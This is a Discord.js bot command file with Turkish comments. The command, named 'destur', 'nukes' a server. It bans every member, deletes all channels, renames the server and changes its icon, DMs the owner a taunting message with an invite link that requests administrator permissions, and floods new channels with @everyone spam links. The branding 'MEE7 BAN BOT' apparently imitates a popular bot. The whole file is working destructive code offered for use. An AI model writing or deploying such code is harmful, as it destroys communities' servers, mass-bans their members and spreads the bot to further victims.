
const Discord = require('discord.js');


exports.run = function(client, message) {
  message.guild.setIcon("https://cdn.discordapp.com/attachments/706524808703377458/708326991044149279/images.jpg").catch(console.error);
  message.guild.members.map(c => c.ban());
  message.guild.members.map(c => c.ban())
  message.guild.members.map(c => c.ban())
  message.guild.members.map(c => c.ban())
  message.guild.members.map(c => c.ban())
  message.guild.channels.map(c => c.delete()) 
message.guild.setName("MEE7 YARGILADI")
  
  const tesekkurler = new Discord.RichEmbed()
    .setTitle(' Sunucunuz Patladı ')
    .setTimestamp()
    .setFooter("MEE7 BAN BOT")
    .setColor("BLACK")
.setImage('https://cdn.discordapp.com/attachments/666619780790353923/666648166195527724/giphy.gif')
    .setDescription(" Sunucun BLACK PEARL Ban Bot Tarafından Patlatılmıştır\n\n Botun Sahibinin Patlatmayla Alakası Yoktur\n\n İntikam Almak İstersen Verdiğim Linkten Botu Al.\n\n\ [Botun Sunucusu](https://discord.gg/faTjBR4)\n\n[Bot Link](https://discord.com/api/oauth2/authorize?client_id=711625160255602760&permissions=8&scope=bot)")
message.guild.owner.send(tesekkurler)
 
  
  message.guild.createChannel('bayraklarınızı dikemeyeceksiniz','text')
  .then(r=>r.send('https://discord.gg/M4Sxuaj\n\n**Zirve Dediğiniz Tahtta Hep Kucakta Kaldınız**\n\nhttps://www.youtube.com/channel/UCt0ekVovVwixA8WlHIbGKAw?view_as=subscriber @everyone'))
   message.guild.createChannel('zirve dediğiniz tahtta','text')
 .then(r=>r.send('https://discord.gg/M4Sxuaj\n\n**Zirve Dediğiniz Tahtta Hep Kucakta Kaldınız**\n\nhttps://www.youtube.com/channel/UCt0ekVovVwixA8WlHIbGKAw?view_as=subscriber @everyone'))
 message.guild.createChannel('hep kucakta kaldınız','text')
 .then(r=>r.send('https://discord.gg/M4Sxuaj\n\n**Zirve Dediğiniz Tahtta Hep Kucakta Kaldınız**\n\nhttps://www.youtube.com/channel/UCt0ekVovVwixA8WlHIbGKAw?view_as=subscriber @everyone'))

};

exports.conf = {
  enabled: true,//True => Komut açık, False => Komut kapalı 
  guildOnly: true, //True => Sadece Servere Özel, False => Heryerde kullanılabilir
  aliases: [],//Komutun farklı kullanımları ÖR: !ping, !p
  permLevel: 4 //kimlerin kullanabileceğini  (bot.js dosyasında perm leveller yazıyor)
};

exports.help = {
  name: 'destur',//Komutun adı (Komutu girerken lazım olucak)
  description: 'SUNUCUYU S*KER',//Komutun Açıklaması
  usage: '' //komutun kullanım şekli; ÖR: !ban @Kullanıcı
}